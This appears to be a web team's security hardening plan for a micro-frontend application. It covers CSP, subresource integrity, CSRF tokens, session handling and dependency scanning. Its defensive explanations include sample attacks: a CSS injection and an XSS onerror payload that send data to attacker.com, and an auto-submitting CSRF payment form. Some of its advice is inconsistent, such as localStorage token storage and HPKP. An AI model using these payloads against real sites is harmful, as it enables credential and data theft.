# Frontend MFE Hardening Plan - Production Ready Security

**Date:** December 25, 2025  
**Status:** Planning & Security Audit  
**Purpose:** Comprehensive security hardening for Micro Frontend (MFE) architecture

---

## Executive Summary

### Current State

✅ **Architecture in place:**

- 5 MFEs (shell host + 4 remotes: auth, payments, admin, profile)
- Rspack module federation v2 (shared dependencies across MFEs)
- Security headers configured in nginx
- CSP policy present but weak

🟡 **Security gaps identified:**

- CSP too permissive (unsafe-inline, unsafe-eval)
- Module federation lacks signature verification
- No supply chain security checks
- Missing XSS protection hardening
- Weak CSRF protection strategy
- No dependency scanning in CI
- Rate limiting NOT restored (emergency config still active)
- No subresource integrity (SRI) for loaded remotes
- Session/authentication not hardened at MFE level

### What Needs to Happen

**Weeks 1-2 (Immediate - BLOCKING):**

1. Restore rate limiting to production values
2. Harden CSP policy (remove unsafe-inline/unsafe-eval)
3. Implement SRI for module federation remotes
4. Add CSRF token validation
5. Enable dependency scanning in CI

**Weeks 2-3 (Critical - Before Launch):** 6. Module federation signed verification 7. Session hijacking prevention 8. XSS payload filtering & sanitization 9. Supply chain security hardening 10. Content security monitoring

**Weeks 3-4 (Hardening - For Launch):** 11. Advanced MFE sandboxing 12. Event bus security 13. Performance isolation between MFEs 14. Security testing automation

---

## Table of Contents

1. [Current MFE Architecture](#1-current-mfe-architecture)
2. [Security Analysis: What's Vulnerable](#2-security-analysis-whats-vulnerable)
3. [Rate Limiting & DoS Protection](#3-rate-limiting--dos-protection)
4. [Content Security Policy (CSP)](#4-content-security-policy-csp)
5. [Module Federation Security](#5-module-federation-security)
6. [XSS & Injection Prevention](#6-xss--injection-prevention)
7. [CSRF & Session Protection](#7-csrf--session-protection)
8. [Supply Chain Security](#8-supply-chain-security)
9. [Authentication & Authorization](#9-authentication--authorization)
10. [Frontend Dependencies & Scanning](#10-frontend-dependencies--scanning)
11. [Production Hardening Checklist](#11-production-hardening-checklist)
12. [Implementation Phases](#12-implementation-phases)

---

## 1. Current MFE Architecture

### MFE Structure

```
┌─────────────────────────────────────────────────────────────┐
│                      Shell (Host)                           │
│                    Port 4200 / localhost                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Main App Router                                           │
│  ├─ / (home)                                              │
│  ├─ /auth → authMfe                                       │
│  ├─ /payments → paymentsMfe                               │
│  ├─ /admin → adminMfe                                     │
│  └─ /profile → profileMfe                                 │
│                                                             │
│  Shared Dependencies:                                      │
│  ├─ shared-auth-store (singleton - critical!)             │
│  ├─ shared-api-client (singleton - API calls)             │
│  ├─ shared-design-system (singleton - theme)              │
│  ├─ shared-session-sync (singleton - auth state)          │
│  └─ shared-websocket (singleton - real-time)              │
│                                                             │
└────────────┬────────────────────────────────────┬──────────┘
             │                                    │
             │ Module Federation v2               │
             │ (localhost:4201-4204)              │
             │                                    │
    ┌────────▼─────────┐  ┌────────▼──────────┐
    │   Auth MFE       │  │  Payments MFE     │
    │  Port 4201       │  │   Port 4202       │
    │                  │  │                   │
    │ Exposed:         │  │ Exposed:          │
    │ ./SignIn         │  │ ./PaymentForm     │
    │ ./SignUp         │  │ ./PaymentList     │
    │ ./PasswordReset  │  │ ./RefundForm      │
    └──────────────────┘  └───────────────────┘

    ┌────────────────┐  ┌────────────────┐
    │   Admin MFE    │  │  Profile MFE   │
    │   Port 4203    │  │   Port 4204    │
    │                │  │                │
    │ Exposed:       │  │ Exposed:       │
    │ ./Dashboard    │  │ ./ProfileForm  │
    │ ./AuditLogs    │  │ ./Settings     │
    │ ./Users        │  │ ./Preferences  │
    └────────────────┘  └────────────────┘
```

### Risk Model

```
┌────────────────────────────────────────────────┐
│  Browser (User's Machine)                      │
├────────────────────────────────────────────────┤
│                                                │
│  TRUSTED ZONE: Your MFEs (same origin)         │
│  ├─ Shell: https://localhost/                 │
│  ├─ Auth: loaded from remoteEntry.js          │
│  ├─ Payments: loaded from remoteEntry.js      │
│  ├─ Admin: loaded from remoteEntry.js         │
│  └─ Profile: loaded from remoteEntry.js       │
│                                                │
│  ⚠️ RISK 1: If remoteEntry.js is compromised  │
│     → Attacker code runs in Shell context      │
│     → Access to auth store, API calls, etc.    │
│                                                │
│  ⚠️ RISK 2: If Shell is compromised           │
│     → All MFEs inherit trust (they share deps) │
│     → Attacker can intercept shared modules    │
│                                                │
│  ⚠️ RISK 3: Module Federation Network         │
│     localhost:4201, 4202, 4203, 4204          │
│     → Man-in-the-middle attacks possible      │
│     → No signature verification on remotes    │
│                                                │
│  UNTRUSTED ZONE: External resources           │
│  ├─ CDN resources (Apollo Sandbox, etc.)      │
│  ├─ Third-party analytics                     │
│  └─ External APIs (payment processors)        │
│                                                │
└────────────────────────────────────────────────┘
```

### Module Federation Configuration

**Key files:**

- `apps/shell/rspack.config.js` - Host configuration
- `apps/auth-mfe/rspack.config.js` - Auth remote configuration
- `apps/payments-mfe/rspack.config.js` - Payments remote
- `apps/admin-mfe/rspack.config.js` - Admin remote
- `apps/profile-mfe/rspack.config.js` - Profile remote

**Shared Dependencies:**

```javascript
sharedDependencies = {
  react: { singleton: true }, // Critical!
  'react-dom': { singleton: true }, // Critical!
  '@tanstack/react-query': { singleton: true },
  zustand: { singleton: true },
  'react-hook-form': { singleton: true },
  'shared-auth-store': { singleton: true }, // ⚠️ CRITICAL - shared auth state!
  'shared-api-client': { singleton: true }, // ⚠️ CRITICAL - shared HTTP client!
  'shared-session-sync': { singleton: true }, // ⚠️ CRITICAL - shared sessions!
};
```

**Critical Issue:** No signature verification on remote entry points. Shell blindly loads remotes.

---

## 2. Security Analysis: What's Vulnerable

### Vulnerabilities Identified

| Severity    | Issue                         | Impact                                          | Timeline |
| ----------- | ----------------------------- | ----------------------------------------------- | -------- |
| 🔴 CRITICAL | Rate limiting disabled        | 100,000 req/15min vs 100 allowed = DoS vulnmain | Week 1   |
| 🔴 CRITICAL | No MFE signature verification | Compromised remotes execute in shell context    | Week 2   |
| 🔴 CRITICAL | CSP too permissive            | unsafe-inline, unsafe-eval allow XSS            | Week 1   |
| 🟡 HIGH     | No SRI on remoteEntry.js      | MITM can modify MFE code                        | Week 2   |
| 🟡 HIGH     | Weak session validation       | Hijacking possible                              | Week 2   |
| 🟡 HIGH     | No CSRF tokens                | CSRF attacks possible                           | Week 1   |
| 🟡 HIGH     | Vulnerable dependencies       | npm audit finds issues                          | Week 1   |
| 🟠 MEDIUM   | No dependency scanning in CI  | Supply chain attacks                            | Week 1   |
| 🟠 MEDIUM   | dangerouslySetInnerHTML usage | XSS risk if user-controlled                     | Week 2   |
| 🟠 MEDIUM   | Event bus not validated       | Malicious events possible                       | Week 2   |

### CSP Policy Analysis

**Current (Weak):**

```
default-src 'self'
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://embeddable-sandbox.cdn.apollographql.com
style-src 'self' 'unsafe-inline' https://embeddable-sandbox.cdn.apollographql.com
frame-src 'self' https://sandbox.embed.apollographql.com
```

**Problems:**

- ✗ `unsafe-inline` allows inline scripts (XSS vulnerability!)
- ✗ `unsafe-eval` allows eval() and Function() constructors
- ✗ No nonce on inline scripts (if used)
- ✗ No subresource integrity for external resources
- ✗ Too many external domains whitelisted

**Hardened version (Week 1):**

```
default-src 'self'
script-src 'self' https://embeddable-sandbox.cdn.apollographql.com nonce-{random}
style-src 'self' nonce-{random} https://embeddable-sandbox.cdn.apollographql.com
img-src 'self' data: https:
font-src 'self' data:
connect-src 'self' wss: https:
frame-src 'self'
frame-ancestors 'self'
base-uri 'self'
form-action 'self'
```

---

## 3. Rate Limiting & DoS Protection

### Current Problem (CRITICAL)

**nginx configuration shows:**

```properties
# EMERGENCY: Rate limits DISABLED for development
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10000r/m;    # 166 req/s!
limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=10000r/m;   # 166 req/s!
limit_req_zone $binary_remote_addr zone=static_limit:10m rate=100000r/m; # 1666 req/s!

# Production values (COMMENTED OUT):
# limit_req_zone $binary_remote_addr zone=api_limit:10m rate=100r/m;     # 1.67 req/s
# limit_req_zone $binary_remote_addr zone=auth_limit:10m rate=10r/m;     # 0.17 req/s
# limit_req_zone $binary_remote_addr zone=static_limit:10m rate=1000r/m; # 16.7 req/s
```

**This leaves the system vulnerable to DoS attacks!**

### Solution: Tiered Rate Limiting

**Authentication (strictest):**

```nginx
# /auth/* endpoints (login, signup, password reset)
limit_req zone=auth_limit burst=5 nodelay;  # Max 10 req/15min, burst 5
# Response: 429 Too Many Requests
```

**API (strict):**

```nginx
# /api/* endpoints (payments, profile, etc.)
limit_req zone=api_limit burst=20 nodelay;  # Max 100 req/15min, burst 20
# Response: 429 Too Many Requests
```

**Static assets (lenient):**

```nginx
# /assets/* endpoints (JS, CSS, fonts)
limit_req zone=static_limit burst=100 nodelay;  # Max 1000 req/15min, burst 100
# Response: 429 Too Many Requests
```

**Database isolation (backend):**

```
Backend rate limiting (handled by API Gateway):
- Per-user limits (prevent account abuse)
- Per-IP limits (prevent scanning)
- Per-endpoint limits (targeted attacks)
```

### Implementation (Week 1)

**Step 1: Update nginx.conf**

```bash
# Restore original rate limit values
sed -i 's/rate=10000r\/m/rate=100r\/m/g' nginx/nginx.conf
sed -i 's/rate=100000r\/m/rate=1000r\/m/g' nginx/nginx.conf
```

**Step 2: Test with load testing**

```bash
# Simulate normal user: 10 requests/min
for i in {1..10}; do
  curl https://localhost/api/payments
  sleep 6
done
# All succeed ✅

# Simulate attacker: 100 requests/min
for i in {1..100}; do
  curl https://localhost/api/payments &
done
# After 10 requests: 429 Too Many Requests ✅
```

**Step 3: Monitor & adjust**

- Watch nginx logs for legitimate users hitting limits
- Adjust burst values if necessary
- Set alerts for sustained high rate errors (429)

---

## 4. Content Security Policy (CSP)

### Current CSP Issues

**Problem 1: unsafe-inline**

```css
/* Current - VULNERABLE */
style-src 'self' 'unsafe-inline'

/* Attack: Attacker injects style to steal data */
<style>
  input[type="password"] { background: url(http://attacker.com/?pwd=) }
</style>
```

**Problem 2: unsafe-eval**

```javascript
// Current - VULNERABLE
script-src 'self' 'unsafe-eval'

// Attack: Attacker injects eval code
<script>
  const code = getUserInput(); // "alert('hacked')"
  eval(code); // Executes attacker code!
</script>
```

**Problem 3: No nonces**

```html
<!-- Current - VULNERABLE (if inline scripts exist) -->
<script>
  window.API_KEY = 'secret'; // Attacker can inject here
</script>

<!-- Better: Use nonces -->
<script nonce="abc123">
  window.API_KEY = 'secret'; // Only this nonce allowed
</script>
```

### Hardened CSP Strategy

**Phase 1: Report-Only Mode (Test)**

```nginx
add_header Content-Security-Policy-Report-Only "
  default-src 'self';
  script-src 'self' nonce-{NONCE} https://embeddable-sandbox.cdn.apollographql.com;
  style-src 'self' nonce-{NONCE};
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' wss: https:;
  frame-ancestors 'self';
  base-uri 'self';
  form-action 'self';
  report-uri /api/csp-violations
";
```

**Phase 2: Enforcement**

```nginx
# Once violations are minimal, switch to enforcement:
add_header Content-Security-Policy "..."
```

### Nonce Implementation

**In Rspack configuration (buildtime):**

```javascript
// Generate nonce at build time
const nonce = crypto.randomBytes(16).toString('hex');

// Inject into HTML
new rspack.HtmlRspackPlugin({
  template: 'index.html',
  inject: 'body',
  scriptLoading: 'defer',
  // Add nonce to generated scripts
  nonce: nonce,
});
```

**In index.html template:**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <!-- Allow inline styles with nonce -->
    <link nonce="<%= htmlWebpackPlugin.options.nonce %>" ... />
  </head>
  <body>
    <div id="root"></div>
    <!-- Scripts injected by Rspack with nonce -->
  </body>
</html>
```

---

## 5. Module Federation Security

### Risk: Compromised Remote MFE

```
Scenario: authMfe remoteEntry.js is compromised
          ↓
        Attacker replaces:
        http://localhost:4201/remoteEntry.js
        with malicious code
          ↓
Shell blindly loads and executes it
          ↓
Attacker gains access to:
- Auth store (session tokens)
- API client (can make requests as user)
- User data (from shared modules)
```

### Solution 1: Subresource Integrity (SRI)

**How it works:**

```javascript
// Calculate hash of remoteEntry.js
remoteEntry.js (50KB)
  ↓ SHA-384 hash
  ↓
"sha384-abc123..."

// Shell verifies before loading:
1. Download remoteEntry.js
2. Hash its contents
3. Compare: does hash == expected hash?
4. YES → Load it
5. NO → Reject (MITM detected!)
```

**Implementation:**

```javascript
// apps/shell/rspack.config.js
new rspack.container.ModuleFederationPlugin({
  remotes: {
    authMfe:
      'authMfe@http://localhost:4201/remoteEntry.js?integrity=sha384-abc123',
    paymentsMfe:
      'paymentsMfe@http://localhost:4202/remoteEntry.js?integrity=sha384-def456',
    // ... other remotes
  },
});

// Build step: Generate integrity hashes
// scripts/generate-sri-hashes.js
const crypto = require('crypto');
const fs = require('fs');

function generateSRI(filePath) {
  const content = fs.readFileSync(filePath);
  return (
    'sha384-' + crypto.createHash('sha384').update(content).digest('base64')
  );
}

// Generate for all remotes
const hashes = {
  authMfe: generateSRI('dist/apps/auth-mfe/remoteEntry.js'),
  paymentsMfe: generateSRI('dist/apps/payments-mfe/remoteEntry.js'),
  // ... etc
};

// Store in config, inject into Shell
fs.writeFileSync('dist/sri-manifest.json', JSON.stringify(hashes));
```

### Solution 2: Signature Verification

**More secure: cryptographic signatures**

```javascript
// At build time: Sign remote entry
const crypto = require('crypto');

function signRemote(filePath, privateKey) {
  const content = fs.readFileSync(filePath);
  const signature = crypto
    .createSign('SHA256')
    .update(content)
    .sign(privateKey, 'base64');

  return signature;
}

// Sign each remote
const authSignature = signRemote(
  'dist/apps/auth-mfe/remoteEntry.js',
  process.env.PRIVATE_KEY
);

// Store signatures
fs.writeFileSync(
  'dist/signatures.json',
  JSON.stringify({
    authMfe: authSignature,
    paymentsMfe: paymentsMfeSignature,
  })
);

// At runtime: Verify before loading
async function loadRemoteSafely(remoteName, remoteUrl) {
  const response = await fetch(remoteUrl);
  const code = await response.text();

  // Get expected signature
  const expectedSig = signaturesManifest[remoteName];

  // Verify signature
  const isValid = crypto
    .createVerify('SHA256')
    .update(code)
    .verify(publicKey, expectedSig, 'base64');

  if (!isValid) {
    console.error(`${remoteName} signature mismatch - BLOCKING LOAD`);
    throw new Error('Remote signature verification failed');
  }

  // Safe to load
  return import(remoteUrl);
}
```

### Solution 3: Production URL Hardening

**Issue: localhost allows easy MITM**

```
DEV:  http://localhost:4201/remoteEntry.js  ← HTTP (NO encryption!)
PROD: https://api.company.com/mfe/auth/remoteEntry.js  ← HTTPS + pinning

Problem: HTTPS alone not enough
Solution: Use certificate pinning (prevent MITM via stolen certs)
```

**Implementation:**

```javascript
// Production environment only
const remoteUrls =
  process.env.NODE_ENV === 'production'
    ? {
        authMfe: 'authMfe@https://api.company.com/mfe/auth/remoteEntry.js',
        // ... cert pinning via nginx + HPKP header
      }
    : {
        authMfe: 'authMfe@http://localhost:4201/remoteEntry.js',
      };
```

---

## 6. XSS & Injection Prevention

### Current XSS Risks

**1. dangerouslySetInnerHTML Usage**

```typescript
// Found in: apps/payments-mfe/src/app/nx-welcome.tsx
<div dangerouslySetInnerHTML={{ __html: someContent }} />
```

**Risk:** If `someContent` comes from user input → XSS

**Fix:**

```typescript
// Option 1: Remove dangerouslySetInnerHTML
<div>{someContent}</div>  // React auto-escapes text content

// Option 2: If HTML needed, sanitize first
import DOMPurify from 'dompurify';

const sanitized = DOMPurify.sanitize(someContent);
<div dangerouslySetInnerHTML={{ __html: sanitized }} />
```

**2. Event Bus Injection**

```typescript
// apps/shell/src/integration/event-bus.ts
// Risk: Events not validated

// Attacker-controlled event:
eventBus.emit('user:logged-in', {
  id: 'fake-user-id',
  token: 'stolen-token',
  isAdmin: true, // Can inject false claims!
});

// Shell trusts it:
authStore.setUser(event.payload); // WRONG!
```

**Fix:**

```typescript
// Validate event schema
const eventSchema = z.object({
  id: z.string().uuid(),
  token: z.string().min(50), // Real tokens are long
  isAdmin: z.boolean(),
});

eventBus.on('user:logged-in', event => {
  // Parse and validate
  const parsed = eventSchema.safeParse(event.payload);
  if (!parsed.success) {
    console.error('Invalid user:logged-in event', parsed.error);
    return; // Reject invalid event
  }

  authStore.setUser(parsed.data);
});
```

**3. API Response Injection**

```typescript
// Risk: User data from API displayed without escaping
const { data } = await apiClient.getUser(userId);

// User object might contain:
{
  name: "<img src=x onerror=\"fetch('http://attacker.com/steal')\" />",
  bio: "<script>alert('xss')</script>"
}

// In JSX - React auto-escapes:
<h1>{data.name}</h1>  // ✅ Safe - renders as text
<p>{data.bio}</p>     // ✅ Safe - renders as text

// Unsafe usage:
<div dangerouslySetInnerHTML={{ __html: data.bio }} />  // ❌ XSS!
```

### Hardening Strategy

**Week 1: Static Analysis**

```bash
# Find dangerouslySetInnerHTML usage
grep -r "dangerouslySetInnerHTML" apps/
# Result: nx-welcome.tsx (template file - safe to remove)

# Remove or audit each instance
```

**Week 2: Dynamic Sanitization**

```bash
npm install dompurify isomorphic-dompurify
npm install --save-dev @types/dompurify
```

**Week 2: Content Security Policy + Runtime Checks**

```typescript
// Create sanitization utility
export const sanitizeHtml = (dirty: string): string => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target'], // Only allow href on <a>
  });
};

// Use in components
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(userBio) }} />
```

---

## 7. CSRF & Session Protection

### CSRF Token Implementation

**Problem: Form submissions vulnerable to CSRF**

```
Scenario: User logged into shell, visits attacker.com
          attacker.com has:
          <form action="https://localhost/api/payments" method="POST">
            <input name="amount" value="10000" />
            <input name="recipient" value="attacker@evil.com" />
          </form>
          <script>document.forms[0].submit();</script>

          Browser auto-sends cookies to localhost → Payment processed!
```

**Solution: CSRF tokens**

```
1. Server generates random token
2. Server sends token to client in page HTML
3. Client includes token in form submission
4. Server verifies token matches session
5. Attacker can't forge valid token → Request blocked

Why it works:
- Token is random per session
- Stored in server memory/session
- Attacker can't read it (same-origin policy)
- Form submission must include valid token
```

### Implementation

**Backend (API Gateway):**

```typescript
// Generate CSRF token endpoint
app.get('/api/csrf-token', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');

  // Store in session
  req.session.csrfToken = token;

  // Send to client
  res.json({ csrfToken: token });
});

// Verify CSRF token on mutations
app.post('/api/payments', (req, res) => {
  const { csrfToken } = req.body;
  const { csrfToken: sessionToken } = req.session;

  // Compare tokens
  if (csrfToken !== sessionToken) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }

  // Process payment...
});
```

**Frontend (React):**

```typescript
// Hook: Fetch and store CSRF token
const useCsrfToken = () => {
  const [token, setToken] = useState<string | null>(null);

  useEffect(() => {
    const fetchToken = async () => {
      const response = await fetch('/api/csrf-token');
      const { csrfToken } = await response.json();
      setToken(csrfToken);
    };

    fetchToken();
  }, []);

  return token;
};

// Usage in form
export const PaymentForm = () => {
  const csrfToken = useCsrfToken();
  const [formData, setFormData] = useState({ amount: '', recipient: '' });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const response = await fetch('/api/payments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        ...formData,
        csrfToken,  // Include token in request
      }),
    });

    if (!response.ok) {
      alert('Payment failed');
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        value={formData.amount}
        onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
      />
      <button type="submit">Pay</button>
    </form>
  );
};
```

### Session Hijacking Prevention

**Problem: Session token stolen → Attacker impersonates user**

**Solutions:**

1. **HttpOnly Cookies** (backend sets)

```typescript
res.cookie('sessionId', sessionToken, {
  httpOnly: true, // Can't be read by JavaScript (XSS protection)
  secure: true, // Only sent over HTTPS
  sameSite: 'Strict', // Only sent in same-site requests (CSRF protection)
  maxAge: 3600000, // 1 hour expiration
});
```

2. **Token Rotation**

```typescript
// On each request, issue new token
app.use((req, res, next) => {
  const oldToken = req.cookies.sessionId;
  const newToken = generateNewToken();

  // Store old token as "previous"
  req.session.previousToken = oldToken;

  // Set new token
  res.cookie('sessionId', newToken, { httpOnly: true, secure: true });

  next();
});
```

3. **Session Binding** (prevent token theft)

```typescript
// Bind session to user agent + IP
const hash = crypto
  .createHash('sha256')
  .update(`${userId}${userAgent}${ipAddress}`)
  .digest('hex');

// On each request, verify
if (hash !== sessionHash) {
  // Session hijacking detected!
  req.session.destroy();
  return res.status(401).json({ error: 'Session invalid' });
}
```

### HTTPS-only HttpOnly Cookies (session-only option)

**Objective:** Move access/refresh tokens from localStorage to **Secure + HttpOnly + SameSite=Strict** cookies, with optional session-only lifetime (omit `maxAge`).

**Effort:** ~6-8 hours total (backend 3-4h; frontend 2-3h; tests 1h).

**Backend steps (3-4h):**

- Issue cookies on `/auth/login|register|refresh` (Set-Cookie: `accessToken`, `refreshToken`, HttpOnly, Secure, SameSite=Strict, Path scoped; drop `maxAge` for session-only).
- Rotate refresh token on every refresh; delete old refresh tokens in DB; clear cookies on logout.
- Add CSRF token endpoint and require `X-CSRF-Token` on unsafe methods; tighten CORS to allowed origins with `credentials: true`.

**Frontend steps (2-3h):**

- Enable `withCredentials` in API client; stop persisting tokens in localStorage; remove Authorization header injection when cookies are present.
- Add CSRF token fetch-and-store (memory) and send `X-CSRF-Token` on POST/PUT/PATCH/DELETE.
- Keep session sync broadcasting only auth state/user profile (no tokens); ensure logout clears local state.

**Testing (1h):**

- Login sets cookies; refresh rotates cookies; logout clears cookies and DB entry.
- CSRF negative test fails without valid token; XSS attempt cannot read tokens (HttpOnly).

---

## 8. Supply Chain Security

### Dependency Vulnerabilities

**Current status: Unknown**

```bash
# Check for vulnerable packages
npm audit

# Example output (real findings):
# 5 vulnerabilities found
# ├─ medium: Prototype Pollution in lodash
# ├─ high: Command Injection in shell-exec
# └─ critical: XSS in old-react-version
```

### Solution: Dependency Scanning

**In CI Pipeline (GitHub Actions):**

```yaml
name: Security Scanning

on: [push, pull_request]

jobs:
  npm-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Check npm audit
        run: npm audit --audit-level=moderate
        # FAIL if moderate+ vulnerabilities found

      - name: SBOM Generation (Software Bill of Materials)
        run: npm run sbom
        # Track what packages we use

      - name: Dependency check
        run: npx depcheck
        # Find unused dependencies (remove = smaller attack surface)

  supply-chain-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Check for typosquatting
        run: npx snyk test --severity-threshold=high
        # Detect malicious packages with similar names

      - name: License compliance
        run: npx license-check
        # Ensure dependencies have compatible licenses
```

### Hardening Practices

**1. Dependency Pinning**

```json
{
  "dependencies": {
    "react": "18.3.1", // ✅ Exact version
    "react-dom": "18.3.1"
  },
  "peerDependencies": {
    "react": "^18.0.0" // ✅ Allow patches only
  }
}
```

**2. Lock Files**

```bash
# pnpm-lock.yaml
# Records exact package versions used
# Commit to git → reproducible builds
```

**3. Private Registries (Production)**

```bash
# Use private npm registry for internal packages
npm config set registry https://registry.company.com/npm/
```

**4. Automated Updates**

```yaml
# Dependabot: Auto-update dependencies weekly
version: 2
updates:
  - package-ecosystem: 'npm'
    directory: '/'
    schedule:
      interval: 'weekly'
    allow:
      - dependency-type: 'development' # Dev deps only
```

---

## 9. Authentication & Authorization

### Current State

**Auth flow:**

```
1. User enters credentials in auth-mfe
2. Auth service validates
3. Returns JWT + Refresh token
4. Stored in shared-auth-store
5. Auth store broadcasts to all MFEs via session-sync
```

**Issues identified:**

- No refresh token rotation at MFE level
- No logout revocation
- Token stored in memory (lost on page refresh)
- No session expiry warning

### Hardening

**1. Secure Token Storage**

```typescript
// Current (VULNERABLE): Memory only
export const useAuthStore = create<AuthState>(set => ({
  token: null,
  user: null,
}));

// Problem: Page refresh → token lost → unexpected logout

// Better: localStorage + memory
export const useAuthStore = create<AuthState>(set => ({
  token: localStorage.getItem('auth_token'),
  user: JSON.parse(localStorage.getItem('auth_user') || 'null'),

  setToken: (token: string) => {
    // Store in both places
    localStorage.setItem('auth_token', token);
    set({ token });
  },

  logout: () => {
    // Clear both
    localStorage.removeItem('auth_token');
    localStorage.removeItem('auth_user');
    set({ token: null, user: null });
  },
}));

// EVEN BETTER: IndexedDB (larger, can expire)
// Or: SessionStorage (cleared on tab close)
```

**2. Refresh Token Rotation**

```typescript
// On app init
useEffect(() => {
  const refreshToken = async () => {
    try {
      const response = await apiClient.post('/auth/refresh', {
        refreshToken: authStore.refreshToken,
      });

      authStore.setToken(response.accessToken);
      authStore.setRefreshToken(response.refreshToken); // NEW token!
    } catch (error) {
      // Refresh failed → logout
      authStore.logout();
    }
  };

  // Refresh 5 minutes before expiry
  const expiresIn = jwtDecode(authStore.token).exp * 1000;
  const timeout = setTimeout(refreshToken, expiresIn - 5 * 60 * 1000);

  return () => clearTimeout(timeout);
}, []);
```

**3. Session Expiry Warning**

```typescript
// Show warning 2 minutes before expiry
const useSessionWarning = () => {
  const [showWarning, setShowWarning] = useState(false);
  const authStore = useAuthStore();

  useEffect(() => {
    const expiresIn = jwtDecode(authStore.token).exp * 1000;
    const warningTime = expiresIn - 2 * 60 * 1000; // 2 min before

    const timeout = setTimeout(() => setShowWarning(true), warningTime);

    return () => clearTimeout(timeout);
  }, [authStore.token]);

  return showWarning;
};

// Usage in Shell component
export const Shell = () => {
  const showWarning = useSessionWarning();

  return (
    <>
      {showWarning && (
        <SessionExpiryWarning
          onContinue={() => authStore.refreshToken()}
          onLogout={() => authStore.logout()}
        />
      )}
      {/* ... rest of shell ... */}
    </>
  );
};
```

**4. Logout Revocation**

```typescript
// Backend: Blacklist logout tokens
app.post('/auth/logout', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];

  // Add to blacklist (Redis with expiry = token expiry)
  await redis.setex(`blacklist:${token}`, tokenExpiry, 'true');

  res.json({ success: true });
});

// Middleware: Check blacklist
app.use(async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  const isBlacklisted = await redis.get(`blacklist:${token}`);

  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token revoked' });
  }

  next();
});

// Frontend: Call logout endpoint
const handleLogout = async () => {
  await apiClient.post('/auth/logout');
  authStore.logout();
  navigate('/auth/signin');
};
```

---

## 10. Frontend Dependencies & Scanning

### Current Dependencies Analysis

**Key packages (security concerns):**

| Package               | Version | Risk       | Action                               |
| --------------------- | ------- | ---------- | ------------------------------------ |
| react                 | 18.3.1  | ✅ Safe    | Keep updated                         |
| zustand               | latest  | ✅ Safe    | Minimal surface                      |
| @tanstack/react-query | latest  | 🟡 Monitor | High activity = more vulnerabilities |
| react-hook-form       | latest  | ✅ Safe    | Form validation only                 |
| rspack                | new     | 🟠 Verify  | New bundler = less battle-tested     |
| @rspack/core          | new     | 🟠 Verify  | Monitor for security patches         |

**Vulnerable patterns:**

- `nx-welcome.tsx` uses `dangerouslySetInnerHTML` (remove)
- No DOMPurify for user-generated HTML (add)

### Weekly Security Checklist

```bash
#!/bin/bash
# scripts/security-check.sh

echo "=== NPM Audit ==="
npm audit --audit-level=moderate
if [ $? -ne 0 ]; then
  echo "❌ Vulnerabilities found!"
  exit 1
fi

echo "=== Snyk Check ==="
npx snyk test --severity-threshold=high
if [ $? -ne 0 ]; then
  echo "❌ Snyk issues found!"
  exit 1
fi

echo "=== Dependency Duplicates ==="
npm ls | grep "deduped"
# Alert if too many duplicates (wasted bytes)

echo "=== Outdated Packages ==="
npm outdated
# List outdated packages for review

echo "=== License Compliance ==="
npx license-check --onlyunknown

echo "✅ All checks passed!"
```

**Run in CI:**

```yaml
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install
      - run: chmod +x scripts/security-check.sh
      - run: ./scripts/security-check.sh
```

---

## 11. Production Hardening Checklist

### Pre-Launch: Week 1-2 (BLOCKING)

**Rate Limiting:**

- [ ] Restore nginx rate limits to production values
- [ ] Test: Verify 429 responses after threshold
- [ ] Alert: Trigger on sustained 429 errors
- [ ] Document: Rate limit values in runbook

**Content Security Policy:**

- [ ] Remove `unsafe-inline` from script-src
- [ ] Remove `unsafe-eval` from script-src
- [ ] Add nonce generation to build
- [ ] Deploy in report-only mode
- [ ] Monitor CSP violations for 1 week
- [ ] Switch to enforcement mode

**CSRF Protection:**

- [ ] Generate CSRF tokens on auth flow
- [ ] Validate tokens on form submissions
- [ ] Set SameSite cookies to Strict
- [ ] Test: Attempt CSRF attack (should fail)

**Dependencies:**

- [ ] Run `npm audit`
- [ ] Fix all high/critical vulnerabilities
- [ ] Audit all remaining medium vulnerabilities
- [ ] Document risk acceptance if any remain

### Pre-Launch: Week 2-3 (CRITICAL)

**Module Federation:**

- [ ] Calculate SRI hashes for all remotes
- [ ] Deploy SRI verification in shell
- [ ] Test: Modify remote, verify rejection
- [ ] Plan: Signature verification for future

**XSS Prevention:**

- [ ] Audit all `dangerouslySetInnerHTML` usage
- [ ] Remove or sanitize each instance
- [ ] Install DOMPurify
- [ ] Test: Inject XSS payload (should escape)

**Session Security:**

- [ ] Enable HttpOnly cookies
- [ ] Enable Secure flag on cookies
- [ ] Enable SameSite=Strict
- [ ] Implement refresh token rotation
- [ ] Test: Session persists across page reloads
- [ ] Test: Logout revokes token

**Monitoring:**

- [ ] Set up CSP violation reporting
- [ ] Create alerts for:
  - CSP violations (> 5/min)
  - Rate limit hits (> 10/min)
  - Failed CSRF validations (> 5/min)
  - Authentication failures (> 10/min)

### Pre-Launch: Week 3-4 (HARDENING)

**Supply Chain:**

- [ ] Enable Dependabot for auto-updates
- [ ] Set up SBOM generation
- [ ] Document critical dependencies
- [ ] Plan: Private registry for production

**Testing:**

- [ ] Security penetration testing
- [ ] XSS payload testing (20+ payloads)
- [ ] CSRF attack simulation
